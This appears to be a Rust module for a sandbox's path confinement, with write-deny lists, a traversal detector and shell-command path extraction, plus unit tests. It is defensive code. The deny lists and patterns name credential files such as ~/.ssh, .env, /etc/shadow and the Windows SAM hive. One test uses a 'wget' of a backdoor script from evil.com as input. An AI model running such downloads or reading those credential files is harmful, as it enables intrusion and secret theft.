//! Path confinement — extraction, validation, and allow/deny checks.
//!
//! 5-layer defense:
//! 1. `work_dir` isolation
//! 2. Command string scan for absolute paths + redirect targets
//! 3. Allowlist / Denylist glob-based path rules (deny wins over allow)
//! 4. Command pattern deny
//! 5. Post-execution audit

use super::rules::PermissionRules;

// ── Path Confinement ────────────────────────────────────────────────────

/// System paths that are ALWAYS blocked from writes.
pub(crate) fn system_deny_paths() -> Vec<String> {
    vec![
        // Windows
        "C:\\Windows\\**".into(),
        "C:\\Windows\\System32\\**".into(),
        "C:\\Program Files\\**".into(),
        "C:\\Program Files (x86)\\**".into(),
        "C:\\Temp\\**".into(),
        "C:\\tmp\\**".into(),
        "%TEMP%\\**".into(),
        // Unix
        "/etc/**".into(),
        "/tmp/**".into(),
        "/var/tmp/**".into(),
        "/boot/**".into(),
        "/sys/**".into(),
        "/proc/**".into(),
        "/dev/**".into(),
        "/usr/lib/**".into(),
        "/usr/bin/**".into(),
        "/usr/sbin/**".into(),
        "/bin/**".into(),
        "/sbin/**".into(),
        "/lib/**".into(),
        // Sensitive user files
        "~/.ssh/**".into(),
        "~/.gnupg/**".into(),
        "~/.aws/**".into(),
        "**/.env".into(),
        "**/.env.*".into(),
        "**/id_rsa".into(),
        "**/id_ed25519".into(),
        // Project config with secrets — never writeable
        "**/config.toml".into(),
        "**/config.json".into(),
        "**/*.db".into(),
        "**/*.sqlite".into(),
        "**/*.sqlite3".into(),
        "**/.secrets".into(),
        "**/secrets.*".into(),
    ]
}

/// Check if a relative path attempts to traverse UPWARD out of the sandbox
/// AND targets a sensitive location. Pure `../` without a sensitive target
/// is not flagged (it stays within sandbox `work/` dir anyway).
pub(crate) fn has_dangerous_traversal(path: &str) -> bool {
    let has_upward = path.contains("../") || path.contains("..\\");
    if !has_upward {
        return false;
    }

    let sensitive_targets = [
        "etc/",
        "shadow",
        "passwd",
        "hosts",
        "ssh/",
        ".ssh",
        "sudoers",
        "crontab",
        "fstab",
        "resolv.conf",
        "proc/",
        "sys/",
        "boot/",
        "dev/",
        "root/",
        "var/log",
        "var/spool",
        ".aws/",
        ".gpg/",
        ".gnupg/",
        ".env",
        "id_rsa",
        "id_ed25519",
        ".bash_history",
        ".zsh_history",
        // Project secrets
        "config.toml",
        "config.json",
        "data/config",
        "data/db",
        ".secrets",
        "secrets.",
        "credentials",
        ".db",
        ".sqlite",
        ".sqlite3",
    ];
    let sensitive_win = [
        "windows\\",
        "Windows\\",
        "system32\\",
        "System32\\",
        "config\\sam",
        "config\\SAM",
        "config\\system",
        "config\\SYSTEM",
        "config\\security",
        "config\\SECURITY",
        "WinSxS\\",
        "AppData\\Roaming\\",
        "NTUSER.DAT",
    ];

    let normalized = path.replace('\\', "/");
    sensitive_targets.iter().any(|t| {
        let t_norm = t.replace('\\', "/");
        normalized.contains(&t_norm)
    }) || sensitive_win.iter().any(|t| path.contains(t))
}

/// Extract absolute path references from a shell command string.
pub fn extract_paths(command: &str) -> Vec<String> {
    let mut paths = Vec::new();

    // Windows absolute: X:\... or X:/...
    let win_re = regex_lite::Regex::new(r#"[A-Za-z]:[\\/][^\s"'<>|]+"#).unwrap();
    for m in win_re.find_iter(command) {
        paths.push(m.as_str().to_string());
    }

    // Unix absolute: /usr/..., /etc/...
    let unix_re = regex_lite::Regex::new(r#"(?:^|\s)(/[^\s"'<>|]+)"#).unwrap();
    for cap in unix_re.captures_iter(command) {
        if let Some(m) = cap.get(1) {
            paths.push(m.as_str().to_string());
        }
    }

    // Home directory: ~/..., ~\.ssh\...
    let home_re = regex_lite::Regex::new(r#"~[\\/][^\s"'<>|]+"#).unwrap();
    for m in home_re.find_iter(command) {
        paths.push(m.as_str().to_string());
    }

    // Shell redirect targets: > path, >> path
    let redir_re = regex_lite::Regex::new(r#"[12]?>>?\s*([^\s"'&|]+)"#).unwrap();
    for cap in redir_re.captures_iter(command) {
        if let Some(m) = cap.get(1) {
            let p = m.as_str();
            if p.contains('/') || p.contains('\\') {
                paths.push(p.to_string());
            }
        }
    }

    // Filter out URL-like paths (false positives from Windows drive-letter regex).
    paths.retain(|p| !looks_like_url(p));

    paths
}

/// Returns true if a path looks like a URL rather than a filesystem path.
fn looks_like_url(path: &str) -> bool {
    if path.contains("://") {
        if let Some(colon_pos) = path.find(':') {
            if colon_pos > 1 {
                return true;
            }
            if colon_pos == 1 && path.len() > colon_pos + 2 {
                let after = &path[colon_pos..];
                if after.starts_with("://") {
                    return true;
                }
            }
        }
    }
    false
}

/// Check if a path matches a glob pattern.
pub fn glob_match(pattern: &str, path: &str) -> bool {
    let pattern = pattern.replace('\\', "/");
    let path = path.replace('\\', "/");

    let re_pattern = pattern
        .replace('.', "\\.")
        .replace("**", "___DOUBLESTAR___")
        .replace('*', "[^/]*")
        .replace("___DOUBLESTAR___", ".*");
    let anchored = format!("^{}$", re_pattern);

    regex_lite::Regex::new(&anchored)
        .map(|re| re.is_match(&path))
        .unwrap_or(false)
}

/// Check whether a given path is allowed under the current rules.
/// Order: denylist FIRST (always wins), then allowlist.
pub fn is_path_allowed(path: &str, rules: &PermissionRules) -> bool {
    // 1. Deny check — permanent block
    if rules
        .filesystem_write_denylist
        .iter()
        .any(|d| glob_match(d, path))
    {
        return false;
    }

    // 2. Allow check
    rules
        .filesystem_write_allowlist
        .iter()
        .any(|a| glob_match(a, path))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extract_windows_paths() {
        let paths = extract_paths(r#"copy C:\Users\me\file.txt D:\backup\"#);
        assert!(paths.iter().any(|p| p.contains("C:\\Users")));
    }

    #[test]
    fn test_extract_unix_paths() {
        let paths = extract_paths("cp /etc/hosts /tmp/hosts");
        assert!(paths.iter().any(|p| p == "/etc/hosts"));
        assert!(paths.iter().any(|p| p == "/tmp/hosts"));
    }

    #[test]
    fn test_extract_home_paths() {
        let paths = extract_paths("cat ~/.ssh/config");
        assert!(paths.iter().any(|p| p == "~/.ssh/config"));
    }

    #[test]
    fn test_extract_redirect_targets() {
        let paths = extract_paths("echo hi > /tmp/out.txt");
        assert!(paths.iter().any(|p| p == "/tmp/out.txt"));
    }

    #[test]
    fn test_urls_not_extracted_as_paths() {
        let paths = extract_paths("wget http://evil.com/backdoor.sh -O /tmp/x");
        assert!(
            !paths.iter().any(|p| p.contains("://")),
            "URLs should be filtered out, got: {:?}",
            paths
        );
        assert!(paths.iter().any(|p| p == "/tmp/x"));
    }

    #[test]
    fn test_https_url_not_extracted() {
        let paths = extract_paths("curl -s https://api.example.com/data > /tmp/out");
        assert!(
            !paths.iter().any(|p| p.contains("://")),
            "HTTPS URLs should be filtered, got: {:?}",
            paths
        );
        assert!(paths.iter().any(|p| p == "/tmp/out"));
    }

    #[test]
    fn test_windows_path_still_extracted() {
        let paths = extract_paths(r#"copy C:\Users\me\file.txt D:\backup\"#);
        assert!(
            paths.iter().any(|p| p.contains("C:\\Users")),
            "Windows paths should still be extracted, got: {:?}",
            paths
        );
    }

    #[test]
    fn test_glob_match() {
        assert!(glob_match(
            "data/sandbox/**",
            "data/sandbox/abc/work/out.txt"
        ));
        assert!(glob_match("**/.env", "project/backend/.env"));
        assert!(!glob_match("data/sandbox/**", "/etc/passwd"));
    }

    #[test]
    fn test_dangerous_traversal_linux_shadow() {
        assert!(has_dangerous_traversal("../etc/shadow"));
        assert!(has_dangerous_traversal("../../../etc/shadow"));
        assert!(has_dangerous_traversal("../../etc/passwd"));
        assert!(has_dangerous_traversal("../.ssh/id_rsa"));
    }

    #[test]
    fn test_dangerous_traversal_windows_sam() {
        assert!(has_dangerous_traversal(
            r"..\..\windows\system32\config\sam"
        ));
        assert!(has_dangerous_traversal(
            r"..\..\Windows\System32\config\SAM"
        ));
    }

    #[test]
    fn test_safe_traversal_not_flagged() {
        assert!(!has_dangerous_traversal("../build/output"));
        assert!(!has_dangerous_traversal("../src/lib.rs"));
        assert!(!has_dangerous_traversal("../../project/data"));
    }
}
